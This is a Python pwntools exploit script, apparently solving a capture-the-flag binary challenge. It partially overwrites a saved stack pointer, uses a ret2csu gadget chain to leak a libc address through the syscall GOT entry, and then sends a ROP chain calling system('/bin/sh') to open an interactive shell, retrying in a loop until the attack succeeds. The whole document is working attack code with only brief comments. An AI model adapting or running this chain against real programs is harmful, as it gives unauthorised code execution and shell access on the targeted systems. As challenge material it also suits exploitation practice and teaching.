#!/usr/bin/python3
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = elf
def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv)

gdbscript = '''
init-pwndbg
break *0x40134a
break *0x401319
break *0x401379
'''.format(**locals())
context.log_level = 'debug'

def main():
    global p
    p = initialize()

    payload1 = b'A'*0x18
    payload1 += b'\xc8' # Overflow stack address

    p.sendafter(b"to: ",payload1)

    pop_chain = 0x00000000004013da # pop rbx, rbp, r12, r13, r14, r15, ret
    reg_call = 0x00000000004013c0 # rdx, rsi, edi, call qword ptr[r15+rbx*8]

    syscall = elf.got['syscall']

    def ret2csu(call,rdi,rsi,rdx):
        payload = p64(pop_chain)		# first call popper gadget
        payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
        payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx results in equality
        payload += p64(rdi)             # pop r12 #rdi
        payload += p64(rsi)             # pop r13 #rsi
        payload += p64(rdx)             # pop r14 #rdx
        payload += p64(call)            # pop r15 func call
        payload += p64(reg_call)        # 2nd call caller gadget
        payload += p64(0x00)            # add rsp,0x8 padding
        payload += p64(0x00)            # rbx
        payload += p64(0x00)            # rbp
        payload += p64(0x00)            # r12
        payload += p64(0x00)            # r13
        payload += p64(0x00)            # r14
        payload += p64(0xfbfbfbfbfbfbfbfb)            # r15
        return payload

    payload2 = ret2csu(syscall,1,1,syscall)
    payload2 += p64(elf.symbols['main'])
    payload2 += b"\x01"

    p.sendafter(b"send: ",payload2)

    leak = u64(p.recv(8).ljust(8, b"\x00"))
    log.info("Leaked libc address,  write: "+ hex(leak))

    libc.address = leak - libc.symbols['syscall']
    libc_binsh = next(libc.search(b"/bin/sh"))
    libc_system = libc.symbols["system"]

    log.info("Leaked libc address,  base: "+ hex(libc.address))
    log.info("Leaked libc address,  system: "+ hex(libc_system))
    log.info("Leaked libc address,  binsh: "+ hex(libc_binsh))

    payload1 = b'B'*0x18
    payload1 += b'\xf8'

    p.sendafter(b"to: ",payload1)

    payload2 = b"C"*80 # padding, because stack ret address increased
    payload2 += p64(0x000000000040101a) # ret
    payload2 += p64(0x00000000004013e3) # pop_rdi
    payload2 += p64(libc_binsh)
    payload2 += p64(libc_system)
    print(payload2)

    p.sendlineafter(b"send:",payload2)

    p.interactive()

if __name__ == "__main__":
    # main()
    attempts = 0
    while True:
        try:
            attempts += 1
            print(f"Attempt {attempts}")
            main()
        except Exception as e:
            print(e)
            p.close()
            continue
        else:
            break